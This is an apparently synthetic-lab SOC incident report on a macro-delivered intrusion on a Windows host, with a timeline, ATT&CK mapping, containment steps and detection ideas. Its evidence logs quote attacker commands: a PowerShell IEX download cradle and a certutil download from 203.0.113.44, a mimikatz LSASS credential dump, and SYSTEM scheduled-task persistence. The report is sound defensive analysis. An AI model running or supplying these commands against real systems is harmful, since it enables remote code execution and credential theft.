# Case 002: Multi-Stage Intrusion on a Windows Workstation

| Field | Value |
|---|---|
| Case ID | PNB-2026-002 |
| Date | 2026-11-11 |
| Analyst | Meruyert |
| Severity | Critical |
| Status | Escalated to IR, host isolation recommended |
| Data sources | Sysmon (EID 1, 10), System (EID 7045), Windows Defender (EID 5001), `WIN10-LAB` |
| Detections | `win_powershell_encoded_command`, `win_certutil_download`, `win_lsass_process_access`, `win_defender_disabled`, `win_service_install_susp_path`, `win_schtasks_create` |

## Summary

A document opened by `WINWORD.EXE` spawned a hidden, encoded PowerShell command. Within five minutes the host downloaded a payload with `certutil`, executed `mimikatz.exe` from `C:\Users\Public`, and accessed LSASS memory with credential-dumping rights. Two minutes later real-time protection was disabled, followed by a service install and a scheduled task pointing at binaries in `C:\Users\Public`. Six independent detections fired in a nine-minute chain; the sequence is consistent with a macro-delivered loader moving to credential theft and persistence.

Each alert is concerning on its own. The ordering turns them into an intrusion narrative.

## Timeline

`T+00:00` = 2026-11-11 10:38:18Z (all times UTC).

| Offset | Time | Event | Detection |
|---|---|---|---|
| T+00:00 | 10:38:18 | `WINWORD.EXE` spawns `powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgA...` | PowerShell Encoded Command (high) |
| T+00:00 | 10:38:18 | Parent command line references `C:\Users\analyst\Documents\invoice.docm` | None |
| T+02:00 | 10:40:18 | `certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe C:\Users\Public\p.exe` | Certutil Download (high) |
| T+05:00 | 10:43:18 | `C:\Users\Public\mimikatz.exe privilege::debug sekurlsa::logonpasswords` | None (process creation) |
| T+05:08 | 10:43:26 | `mimikatz.exe` opens `lsass.exe` with `GrantedAccess 0x1010` | LSASS Process Access (critical) |
| T+07:00 | 10:45:18 | Defender event 5001: real-time protection disabled | Defender Disabled (high) |
| T+09:00 | 10:47:18 | Service `UpdaterSvc` installed, `ImagePath C:\Users\Public\svc.exe` | Service Install (high) |
| T+09:30 | 10:47:48 | `schtasks.exe /create /tn "Updater" /tr "C:\Users\Public\upd.exe" /sc onlogon /ru SYSTEM /f` | Schtasks Create (medium) |

## Evidence

```text
2026-11-11T10:38:18.848Z  EID 1     powershell.exe  parent=WINWORD.EXE
  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA0AC8AYQAnACkA

2026-11-11T10:40:18.848Z  EID 1     certutil.exe    parent=cmd.exe
  certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe C:\Users\Public\p.exe

2026-11-11T10:43:18.848Z  EID 1     mimikatz.exe    parent=cmd.exe
  C:\Users\Public\mimikatz.exe privilege::debug sekurlsa::logonpasswords

2026-11-11T10:43:26.848Z  EID 10    mimikatz.exe -> C:\Windows\system32\lsass.exe  GrantedAccess=0x1010

2026-11-11T10:45:18.848Z  EID 5001  Windows Defender Antivirus Real-time Protection feature has been disabled.

2026-11-11T10:47:18.848Z  EID 7045  ServiceName=UpdaterSvc  ImagePath=C:\Users\Public\svc.exe

2026-11-11T10:47:48.848Z  EID 1     schtasks.exe    parent=cmd.exe
  schtasks.exe /create /tn "Updater" /tr "C:\Users\Public\upd.exe" /sc onlogon /ru SYSTEM /f
```

The encoded command decodes to a download cradle:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.44/a')
```

## Analysis

* **Initial access.** `WINWORD.EXE` is not a normal parent for PowerShell. Combined with a `.docm` path, this is a macro execution chain (T1566.001 → T1204.002). The document itself was not available for analysis; that is the main evidence gap.
* **Execution.** The PowerShell command is hidden and base64-encoded, and decodes to a remote `IEX` download. This is a loader, not administration.
* **Tool transfer.** `certutil -urlcache` is a signed-binary download primitive. The destination is `C:\Users\Public`, a directory writable by any local user. That choice avoids the usual `%TEMP%` heuristics.
* **Credential access.** `mimikatz.exe` from a user-writable path opens LSASS with `0x1010` (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ). This is the highest-impact event in the chain and justifies immediate isolation.
* **Defense evasion.** Defender event 5001 two minutes later indicates an attempt to keep the payload from being quarantined.
* **Persistence.** A service and a logon-triggered scheduled task both reference `C:\Users\Public` binaries. Two independent persistence mechanisms suggest an operator who expects one to be removed.
* **Lateral movement.** No 4624 type 3/10 events, SMB connections, or remote service creation were observed from `WIN10-LAB` in the window. Absence of evidence here is weak: only Sysmon EID 1/3/10/11/12/13/22 and a subset of Security events are collected.

## ATT&CK mapping

| Technique | Evidence |
|---|---|
| T1566.001: Spearphishing Attachment | `.docm` opened in WINWORD |
| T1204.002: Malicious File | Document spawned PowerShell |
| T1059.001: PowerShell | `-enc` hidden command |
| T1027: Obfuscated Files or Information | Base64 encoded command |
| T1105: Ingress Tool Transfer | `certutil -urlcache` download |
| T1140: Deobfuscate/Decode Files | Base64 decode of the cradle |
| T1003.001: LSASS Memory | `mimikatz` → `lsass.exe`, `0x1010` |
| T1562.001: Disable or Modify Tools | Defender EID 5001 |
| T1543.003: Windows Service | `UpdaterSvc` from `C:\Users\Public` |
| T1053.005: Scheduled Task | `Updater` task, `onlogon`, `SYSTEM` |

## Verdict

**True positive: active intrusion with credential theft and persistence.** The chain is not ambiguous. An encoded download cradle led to credential dumping, defense evasion, and dual persistence within nine minutes.

## Containment and recommendations

1. **Isolate `WIN10-LAB` from the network immediately.** Do not power it off; preserve memory for LSASS analysis.
2. Disable and reset `LAB\analyst`; assume all credentials cached on the host are compromised.
3. Block `203.0.113.44` at egress and DNS.
4. Collect `svc.exe`, `upd.exe`, `p.exe`, and `mimikatz.exe` for hashing; hunt those hashes and the service name `UpdaterSvc` across all endpoints.
5. Check for the `Updater` scheduled task on other hosts and in the domain's GPO.
6. Review email gateway logs for `invoice.docm` delivery to other recipients.

## Detection improvements

* **Sequence detection.** Six alerts in nine minutes should be one incident. Add an EQL `sequence by host.name` for `process_creation where process.parent.name == "WINWORD.EXE"` followed by `process where process.name == "mimikatz.exe"`.
* **Decode and inspect.** The encoded command is the earliest high-fidelity signal; decoding `-enc` payloads automatically would give the URL at T+00:00 instead of T+02:00.
* **Richer process access.** `GrantedAccess 0x1010` is a good start, but signature and parent-chain checks would cut the allowlist needed for EDR agents.
* **Add 4688/4624 telemetry.** Without it, lateral movement cannot be ruled out. It can only be marked "not observed".

## Reproduce

```powershell
.\.venv\Scripts\python.exe -m pipeline.labgen --scenario all
.\.venv\Scripts\python.exe -m pipeline.detect --dry-run   # inspect the six queries
```

## IR close-out

| Metric | Value |
|---|---|
| Observed window | 2026-11-11T10:38:18Z to 2026-11-11T10:47:48Z (570s) |
| Detection span | 2026-11-11T10:38:18Z to 2026-11-11T10:47:48Z (570s) |
| Alerts | 6 |
| Containment status | host isolation recommended |
| Response timing | not measured in the synthetic lab |

The full close-out, with containment, eradication, recovery, communication,
evidence handling, lessons, and open questions, is in the
[IR casebook](../IR.md#pnb-2026-002).
